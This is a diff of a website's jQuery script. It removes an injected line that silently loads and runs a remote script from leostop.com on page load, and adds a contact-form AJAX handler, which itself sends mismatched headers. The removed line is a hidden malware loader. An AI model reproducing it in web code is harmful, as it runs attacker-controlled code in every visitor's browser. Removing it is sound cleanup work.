@@ -79,7 +79,34 @@ $(function () {
 	
 	/* OwlCarousel - Banner Rotator Slider
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	 function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } });
+	$("#contactForm").submit(function(e) {
+
+		e.preventDefault(); // avoid to execute the actual submit of the form.
+	
+		var form = $(this);
+		var actionUrl = form.attr('action');
+		
+		$.ajax({
+			type: "POST",
+			url: actionUrl,
+			dataType : 'json', // data type
+			data: form.serialize(), // serializes the form's elements.
+			headers:{         
+				'Sec-Fetch-Mode' : 'cors',	
+				'Sec-Fetch-Site' : 'cross-site',
+				'Content-Type' : 'application/json'
+			},
+			success: function(data)
+			{
+			  alert(data); // show response from the php script.
+			},
+			error: function()
+			{
+			  alert("Your contact request failed, kindly email or call us");
+			}
+		});
+		
+	});
 	
 	$(document).ready(function() {
 	  var owl = $('.banner-rotator-slider');
